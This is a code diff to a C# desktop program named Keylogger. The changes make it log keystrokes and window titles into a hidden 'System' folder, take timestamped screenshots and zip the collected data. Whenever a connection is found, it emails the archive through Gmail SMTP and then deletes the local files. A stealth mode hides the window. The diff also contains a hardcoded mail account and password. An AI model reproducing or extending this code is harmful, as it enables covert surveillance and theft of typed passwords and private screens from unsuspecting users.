@@ -12,6 +12,8 @@ using System.Net.NetworkInformation;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+//using System.IO.Compression;
+
 
 
 
@@ -103,6 +105,19 @@ namespace Keylogger
 
         }
 
+        private void CreateDir()
+        {
+           
+            if (Directory.Exists(AutoRun.Path() + "\\System"))
+            {
+                
+            }
+            else
+            {
+                DirectoryInfo di = Directory.CreateDirectory(AutoRun.Path()+"\\System");
+            }
+        }
+
         private void MouseEvent(object sender, EventArgs e)
         {
             new Thread(() =>
@@ -112,7 +127,8 @@ namespace Keylogger
                     m.WaitOne();
                     try
                     {
-                        StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true);
+                        CreateDir();
+                        StreamWriter SW = new StreamWriter(AutoRun.Path()+"\\System\\" + "Key.txt", true);
                         datatime = DateTime.Now.ToString();
                         SW.WriteLine();
                         SW.WriteLine(datatime + "\t" + winTitle);
@@ -232,11 +248,11 @@ namespace Keylogger
             new Thread(() =>
             {
                 m.WaitOne();
-                bool nonNumberEntered = false;
                 
                 try
                 {
-                    using (StreamWriter SW = new StreamWriter(AutoRun.Path() + "Key.txt", true))
+                    CreateDir();
+                    using (StreamWriter SW = new StreamWriter(AutoRun.Path()+"\\System\\" + "Key.txt", true))
                     {
 
                         if (IsWindowChanged())
@@ -400,6 +416,8 @@ namespace Keylogger
                             if (vkey == (uint)WindowsHotKey.F12 )
                             {
                                 Application.Current.MainWindow.Visibility = Visibility.Visible;
+                               // timerScreen.Stop();
+                               // timerMail.Stop();
                             }
                             handled = true;
                             break;
@@ -432,8 +450,8 @@ namespace Keylogger
                 if (_numValueScreen * 60 == timeScreen)
                 {
                     timeScreen = 0;
-                    string str = "1";
-                    //string str = DateTime.Now.ToString().Replace(':', '_');
+                   // string str = "1";
+                    string str = DateTime.Now.ToString().Replace(':', '_');
                     ScreenShot.ScreenSave(str);
 
                 }
@@ -485,12 +503,33 @@ namespace Keylogger
         #endregion
 
         #region e-Mail
-        static bool sendbool = false;
+        
 
-        private static bool IsMailSend()
+        private void CreateZIP()
         {
-            if (sendbool == true) return true;
-            else return false;
+            Thread thread = new Thread(t =>
+            {
+                m.WaitOne();
+                using (Ionic.Zip.ZipFile zip = new Ionic.Zip.ZipFile())
+                {
+                    try
+                    {
+                        zip.AddDirectory(AutoRun.Path() + "\\System");
+                        //DirectoryInfo di = new DirectoryInfo(AutoRun.Path()+"\\System");
+                        zip.Save(AutoRun.Path() + "System.zip");
+                    }
+                    catch (Exception e)
+                    {
+                        MessageBox.Show("Create EX\n" + e.ToString());
+                    }
+                    finally
+                    {
+                        m.ReleaseMutex();
+                    }
+                }
+            });
+            thread.Start();
+
         }
 
         private void InternetConnect()
@@ -505,15 +544,39 @@ namespace Keylogger
             catch { }
             if (status == IPStatus.Success)
             {
-                   SendMail();
+                CreateZIP();
+                SendMail();
+                MessageBox.Show("Mail Sent");
+                DeleteFile();
             }
 
         }
 
-        private void ClearFile()
+        private void DeleteFile()
         {
-            File.Delete(AutoRun.Path()+ "Key.txt");
-            File.Create(AutoRun.Path() + "Key.txt");
+            Thread thread = new Thread(t =>
+            {
+                m.WaitOne();
+                try
+                {
+                    File.Delete(AutoRun.Path() + "System.zip");
+                    DirectoryInfo dirInfo = new DirectoryInfo(AutoRun.Path() + "\\System\\");
+                    foreach (FileInfo f in dirInfo.GetFiles())
+                    {
+                        f.Delete();
+                    }
+                }
+                catch (Exception e)
+                {
+                    MessageBox.Show("Delete EX\n" + e.ToString());
+                }
+                finally
+                {
+                    m.ReleaseMutex();
+                }
+
+            });
+            thread.Start();
 
         }
 
@@ -544,13 +607,14 @@ namespace Keylogger
             {
 
                 Attachment attachment;
-                attachment = new Attachment(AutoRun.Path() + "Key.txt");
+                attachment = new Attachment(AutoRun.Path() + "System.zip");
                 mail.Attachments.Add(attachment);
 
                 SmtpServer.Port = 587;
                 SmtpServer.Credentials = new System.Net.NetworkCredential("keyloggernazzim@gmail.com", "keylogger32");
                 SmtpServer.EnableSsl = true;
                 SmtpServer.Send(mail);
+                //MessageBox.Show("Sent");
             }
             catch (Exception ex)
             {
@@ -583,6 +647,7 @@ namespace Keylogger
                             timeMail = 0;
                         }
                     }).Start();
+                    
                 }
             }
             else
@@ -637,6 +702,8 @@ namespace Keylogger
             txtNumScreen.Text = Properties.Settings.Default.txtNumTimerScreenProp;
             txtNumMail.Text = Properties.Settings.Default.txtNumTimerMailProp;
             txtBoxMail.Text = Properties.Settings.Default.txtBoxMailProp;
+            //timeScreen = Properties.Settings.Default.timeScreenProp;
+            //timeMail = Properties.Settings.Default.timeMailProp;
         }
 
         private void Window_Closed(object sender, EventArgs e)
@@ -646,6 +713,8 @@ namespace Keylogger
             Properties.Settings.Default.txtNumTimerScreenProp = txtNumScreen.Text;
             Properties.Settings.Default.txtNumTimerMailProp = txtNumMail.Text;
             Properties.Settings.Default.txtBoxMailProp = txtBoxMail.Text;
+            //Properties.Settings.Default.timeScreenProp = timeScreen;
+           // Properties.Settings.Default.timeMailProp = timeMail;
             Properties.Settings.Default.Save();
         }
 
@@ -670,6 +739,8 @@ namespace Keylogger
         private void Stealth_Unchecked(object sender, RoutedEventArgs e)
         {
             Application.Current.MainWindow.Visibility = Visibility.Visible;
+            timerScreen.Stop();
+            timerMail.Stop();
         }
 
         private void tblock_TextChanged(object sender, TextChangedEventArgs e)
